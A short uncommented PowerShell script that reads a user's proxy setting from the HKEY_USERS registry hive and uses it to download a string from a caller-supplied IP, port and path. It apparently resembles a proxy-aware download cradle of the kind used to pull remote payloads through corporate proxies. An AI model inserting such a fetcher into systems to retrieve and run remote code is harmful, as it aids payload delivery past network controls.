param(
    [string]$ip,
    [int]$port,
    [string]$app
)

New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null

$keys = Get-ChildItem 'HKU:\'
foreach ($key in $keys) {
    if ($key.Name -like "*S-1-5-21-*") {
        $start = $key.Name.Substring(10)
        break
    }
}

$proxyAddr = (Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy("http://$proxyAddr")

$url = "http://$ip`:$port/$app"
$wc = New-Object System.Net.WebClient
$wc.DownloadString($url)
